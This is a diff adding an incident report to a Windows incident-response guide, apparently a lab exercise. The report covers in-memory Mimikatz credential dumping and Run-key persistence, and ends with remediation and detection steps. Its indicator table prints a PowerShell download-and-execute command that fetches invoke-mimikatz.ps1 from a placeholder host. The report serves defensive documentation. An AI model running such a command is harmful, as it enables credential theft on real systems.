@@ -79,3 +79,63 @@ Enable full PowerShell transcription logging.
 ## Step 5. Update & Patch
 Apply any missing Windows security patches.
 Run antivirus/malware scans to verify cleanup.
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+# Incident Report (*Optional*)
+## <br />  Executive Summary
+<br /> On June 17, 2025, suspicious PowerShell activity was detected on an EC2 Windows host. A review of logs confirmed the download and execution of a known credential dumping script (Invoke-Mimikatz). Registry persistence was also observed, indicating an attempt to maintain access. The incident was contained, and mitigation steps were implemented.
+<br />
+
+| IOC Type                    | Value / Description                                                                                     |
+|----------------------------|-------------------------------------------------------------------------------------------------------|
+| PowerShell Download         | IEX (New-Object Net.WebClient).DownloadString('http://example.com/invoke-mimikatz.ps1')                |
+| Persistence                | HKU\...\CurrentVersion\Run\TestRunKey set to launch cmd.exe                                           |
+| Registry Handle Leak        | EVENT_HIVE_LEAK from svchost.exe                                                                       |
+| User                       | EC2AMAZ-OTMH1RS\Administrator                                                                          |
+| Process                    | powershell.exe PID 3020                                                                                 |
+| Timestamp                  | 2025-06-15 18:34:52 UTC                                                                                |
+| Event ID                   | 4104 (PowerShell ScriptBlock Logging)                                                                  |
+| Command                    | powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString..." |
+| Technique                  | T1059.001 – PowerShell<br>T1105 – Remote File Copy<br>T1003.001 – LSASS Memory                          |
+| Significance               | Strong evidence of credential dumping via in-memory Mimikatz execution                                 |
+
+<br />
+<br />
+
+## Analysis
+
+<br />
+Velociraptor logs showed Event ID 4104 containing a PowerShell ScriptBlock attempting to download invoke-mimikatz.ps1. This strongly indicates credential dumping activity. Additionally, Event ID 13 revealed registry RunKey modification used for persistence, and Event ID 1530 disclosed abnormal registry handle leaks, possibly indicative of memory access or mismanagement post-compromise.
+<br />
+
+## Remediation Steps
+<br />1. Terminate Malicious Process:
+- Identify PID (e.g., 3020 running powershell.exe)
+-Kill process via Task Manager or PowerShell
+
+<br />2. Delete Registry Persistence Key:
+-Path: HKU\S-1-5-...\Run\TestRunKey
+-Remove via reg delete or Registry Editor
+
+<br />3. Block PowerShell Web Downloads:
+Group Policy or Defender ASR Rule to restrict *Invoke-WebRequest* or *Net.WebClient*
+
+<br />4. YARA or Velociraptor Rule:
+-Flag Event ID 4104 for downloads from http://*
+Monitor Registry changes to \Run\ keys
+
+## Detection Enhancement
+
+Custom artifact (*CredDumpDetection*) was created and uploaded to Velociraptor to monitor for future suspicious PowerShell and persistence activity. It queries for:
+- Sysmon Event ID 13
+- PowerShell Event ID 4104
+
+
